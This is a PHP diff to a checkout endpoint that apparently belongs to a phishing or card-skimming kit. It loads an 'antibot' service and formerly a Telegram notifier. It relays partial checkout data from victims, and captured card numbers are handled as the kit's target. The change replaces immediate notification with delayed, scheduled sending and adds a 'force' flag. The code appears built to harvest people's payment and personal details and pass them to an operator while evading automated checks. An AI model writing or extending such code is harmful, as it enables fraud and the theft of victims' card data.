@@ -16,7 +16,6 @@ require_once dirname(__DIR__) . '/app/services/antibot.php';
 
 salt_runtime_init();
 require_once dirname(__DIR__) . '/app/services/checkout-pending.php';
-require_once dirname(__DIR__) . '/app/services/telegram.php';
 
 antibot_init();
 
@@ -32,35 +31,21 @@ if (!is_array($payload)) {
     $payload = [];
 }
 
-if ($payload !== []) {
+$force = !empty($payload['force']);
+
+if (!$force && $payload !== []) {
+    unset($payload['force']);
     checkout_pending_save($payload);
-}
 
-$record = checkout_pending_load();
-$data = is_array($record['data'] ?? null) ? $record['data'] : [];
-if ($payload !== []) {
-    $data = array_merge($data, $payload);
-}
-
-if (!checkout_pending_has_informations($data)) {
-    http_response_code(400);
-    echo json_encode(['ok' => false, 'sent' => false, 'error' => 'missing_data']);
+    echo json_encode([
+        'ok' => true,
+        'scheduled' => true,
+        'sent' => false,
+        'delay' => checkout_pending_delay_seconds(),
+    ]);
     exit;
 }
 
-if ($record !== null && (!empty($record['completed']) || !empty($record['notified']))) {
-    echo json_encode(['ok' => true, 'sent' => false, 'skip' => 'already_done']);
-    exit;
-}
-
-if (!empty($data['cardNumber'])) {
-    echo json_encode(['ok' => true, 'sent' => false, 'skip' => 'has_card']);
-    exit;
-}
-
-$sent = notify_partial_order($data);
-if ($sent) {
-    checkout_pending_mark_notified();
-}
+$sent = checkout_pending_try_send(true);
 
 echo json_encode(['ok' => $sent, 'sent' => $sent]);
